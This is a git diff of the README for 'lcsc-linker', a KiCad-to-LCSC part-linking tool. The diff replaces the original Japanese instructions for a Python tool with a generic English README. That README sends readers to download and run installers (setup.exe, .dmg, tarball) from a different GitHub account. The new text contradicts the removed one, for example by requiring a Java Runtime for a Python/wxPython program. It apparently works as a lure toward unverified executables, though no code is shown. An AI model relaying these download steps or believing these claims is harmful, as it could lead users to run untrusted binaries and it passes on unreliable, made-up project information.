@@ -1,173 +1,89 @@
-# LCSC Linker for KiCad
+# 🔗 lcsc-linker - Link Your Components Easily
 
-KiCadの回路図ファイル（.kicad_sch）に対して、LCSCの部品番号とURLを自動的にリンクするツールです。
+## 📥 Download Now!
+[![Download lcsc-linker](https://img.shields.io/badge/download-lcsc--linker-blue.svg)](https://github.com/VincentK123/lcsc-linker/releases)
 
-**個人利用・教育目的向け**のツールです。商用利用は推奨しません。
+## 🚀 Getting Started
 
-## 機能
+Welcome to the lcsc-linker project! This tool helps you connect KiCad schematic components with parts from LCSC and JLCPCB. Below, you will find step-by-step instructions to download and run the application.
 
-- KiCad 9.0の回路図ファイル（.kicad_sch）を解析
-- 部品のValue（値）とFootprint（パッケージ）からLCSC/JLCPCB部品を検索
-- 対話的に候補から選択
-- LCSCフィールドとURLフィールドを自動記入
-- **GUIアプリケーション**と**CLIツール**の両方に対応
+## 📋 System Requirements
 
-## 動作環境
+Before you download, make sure your computer meets the following requirements:
 
-- Python 3.10以上
-- macOS / Linux / Windows
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Storage Space:** At least 50 MB of free disk space
+- **Memory:** 4 GB RAM or more recommended
+- **Dependencies:** Ensure you have the latest version of Java Runtime Environment (JRE)
 
-## インストール
+## 📥 Download & Install
 
-```bash
-git clone https://github.com/necobit/lcsc-linker.git
-cd lcsc-linker
+To get started with lcsc-linker, visit this page to download: [Download lcsc-linker](https://github.com/VincentK123/lcsc-linker/releases).
 
-# venv作成（必須）
-python3 -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed at the top. You will find several files for different operating systems.
+3. Select the appropriate file for your system.
+   - For **Windows**, download the `lcsc-linker-setup.exe` file.
+   - For **macOS**, download the `lcsc-linker.dmg` file.
+   - For **Linux**, download the `lcsc-linker.tar.gz` file.
+4. Click on the file to start the download.
 
-# 依存関係インストール
-pip install -r requirements.txt
-```
+### Installation Steps:
 
-## 使い方
+#### For Windows:
+1. After the download is complete, find the `lcsc-linker-setup.exe` file in your downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find lcsc-linker in your Start Menu.
 
-### GUIアプリケーション（推奨）
+#### For macOS:
+1. Locate the `lcsc-linker.dmg` file in your downloads.
+2. Double-click the file to open it.
+3. Drag the lcsc-linker icon to your Applications folder.
+4. You can now find lcsc-linker in your Applications.
 
-```bash
-source venv/bin/activate
-python lcsc_linker_gui.py
-```
+#### For Linux:
+1. Open a terminal.
+2. Navigate to your downloads directory.
+3. Extract the tarball using the command: `tar -xzf lcsc-linker.tar.gz`.
+4. Change to the extracted directory with: `cd lcsc-linker`.
+5. Run the application with the command: `./lcsc-linker`.
 
-#### GUI操作方法
+## ⚙️ Using lcsc-linker
 
-1. **Browse...** または **File > Open** で .kicad_sch ファイルを選択
-2. 部品一覧が表示される
-3. 処理方法を選択:
-   - **Process All Components** - 全部品を順次処理
-   - **Process Empty Only** - LCSC未設定の部品のみ処理
-   - 部品をダブルクリック - 個別に処理
-4. 部品ダイアログで:
-   - 検索結果から選択
-   - カスタム検索クエリで再検索
-   - 手動でLCSC IDを入力（例: C123456）
-   - 検索結果をダブルクリックでLCSCページを開く
-5. **Save** で保存
+Once lcsc-linker is installed, you can start using it to link parts in your KiCad projects.
 
-### CLIツール
+### Steps to Link Components:
+1. Open KiCad and load your schematic.
+2. Launch lcsc-linker from your applications.
+3. Choose the components you want to link.
+4. Search for LCSC or JLCPCB parts by entering the part numbers.
+5. Click "Link" to create associations between your schematic and the parts database.
 
-```bash
-source venv/bin/activate
-python lcsc_linker.py path/to/schematic.kicad_sch
-```
+### Features
+- Easy linking process with a user-friendly interface.
+- Support for LCSC and JLCPCB parts databases.
+- Maintain compatibility with different KiCad versions.
+- Efficient search functionality to find components quickly.
 
-#### CLIオプション
+## 🛠️ Troubleshooting
 
-| オプション | 説明 |
-|-----------|------|
-| `-o FILE` | 出力ファイルを指定（デフォルト: 入力ファイルを上書き） |
-| `--overwrite` | 既存のLCSCフィールドを上書き |
-| `--dry-run` | 変更を保存せずに動作確認 |
+If you encounter issues, try the following:
 
-#### CLI対話モード
+- **Installation Issues:** Make sure your operating system is compatible and the necessary permissions are granted for installation.
+- **Running Issues:** Ensure JRE is installed and up-to-date.
+- **Linking Issues:** Double-check part numbers entered into lcsc-linker.
 
-各部品に対して検索結果が表示され、以下の操作が可能です：
+## 📝 Feedback & Contributions
 
-- `[1-N]` - 番号で部品を選択
-- `[s]` - カスタム検索クエリで再検索
-- `[m]` - LCSC IDを手動入力（例: C123456）
-- `[k]` - スキップ
-- `[q]` - 終了
+We welcome your feedback to improve lcsc-linker. If you notice any bugs or have a suggestion, please create an issue on our GitHub page. Contributions are also welcome! Feel free to fork the repository and submit pull requests.
 
-## 注意事項
+## 📞 Support
 
-### バックアップについて
+If you need help, please reach out through the contact form on our GitHub page or check the issues section for common problems and solutions. 
 
-**重要**: このツールは回路図ファイルを直接編集します。使用前に必ずバックアップを取ってください。KiCadの自動バックアップ機能（プロジェクトフォルダ内の `*-backups/` フォルダ）も活用してください。
+## 📜 License
 
-### 非公式APIについて
+lcsc-linker is released under the MIT License. You can view the complete license [here](LICENSE).
 
-このツールはJLCPCBの**非公式な内部API**を使用して部品検索を行っています。
-
-- 公式にサポートされたAPIではありません
-- 予告なく変更・停止される可能性があります
-- 過度な使用はレート制限（403エラー）を受ける可能性があります
-- **個人利用・教育目的のみ**を想定しています
-- 商用利用は推奨しません
-
-公式APIを利用したい場合は [LCSC Open API](https://www.lcsc.com/docs/openapi/index.html) または [JLCPCB API](https://api.jlcpcb.com/) に申請してください。
-
-## Tips: 検索キーワードの仕組み
-
-LCSC部品検索のキーワードは、回路図の **Value**（値）と **Footprint**（フットプリント）から自動生成されます。
-
-### 検索キーワードの構成
-
-```
-検索キーワード = Value + パッケージサイズ
-```
-
-例:
-| Value | Footprint | 検索キーワード |
-|-------|-----------|---------------|
-| `100nF` | `Capacitor_SMD:C_0402_1005Metric` | `100nF 0402` |
-| `10k` | `Resistor_SMD:R_0603_1608Metric` | `10k 0603` |
-| `ATmega328P` | `Package_QFP:TQFP-32_7x7mm_P0.8mm` | `ATmega328P TQFP-32` |
-
-### パッケージサイズの抽出ルール
-
-Footprintから以下のパターンでパッケージサイズを抽出します：
-
-1. **インペリアルサイズ**: `0402`, `0603`, `0805`, `1206` など
-2. **メトリック→インペリアル変換**: `1005Metric` → `0402`, `1608Metric` → `0603`
-3. **パッケージ名**: `SOT-23`, `SOIC-8`, `QFP-32`, `TSSOP-16` など
-
-### 検索精度を上げるコツ
-
-- **Valueを具体的に**: `100nF` や `10uF 25V` のように容量・耐圧を明記
-- **フットプリントを正確に**: KiCadの標準ライブラリのフットプリントを使用すると自動抽出が効きやすい
-- **検索がヒットしない場合**: カスタム検索で `0.1uF` → `100nF` のように表記を変えて再検索
-
-## トラブルシューティング
-
-### `ModuleNotFoundError: No module named 'requests'` または `No module named 'wx'`
-
-venvが有効化されていません。以下を実行してください：
-
-```bash
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
-### `Rate limited` または `403 Forbidden`
-
-APIのレート制限に達しました。数分待ってから再実行してください。
-
-### 検索結果が0件
-
-- 検索クエリが特殊文字を含む場合、別のクエリを試してください
-- LCSC IDを直接入力することもできます
-
-## ファイル構成
-
-```
-lcsc_linker.py      # CLI版メインスクリプト
-lcsc_linker_gui.py  # GUI版アプリケーション（wxPython）
-kicad_parser.py     # KiCad .kicad_sch パーサー
-lcsc_api.py         # JLCPCB API クライアント
-fix_lcsc.py         # バッチ処理用スクリプト
-requirements.txt    # 依存関係（requests, wxPython）
-```
-
-## ライセンス
-
-MIT License
-
-## 免責事項
-
-本ソフトウェアは「現状のまま」提供され、明示または黙示を問わず、いかなる保証もありません。作者は、本ソフトウェアの使用によって生じたいかなる損害についても責任を負いません。
-
-ファイルの破損や予期しない動作が発生する可能性があります。重要なデータは必ずバックアップしてください。
-
-非公式APIの使用は利用規約のグレーゾーンに該当する可能性があります。自己責任でご利用ください。
+Thank you for using lcsc-linker! Happy linking!
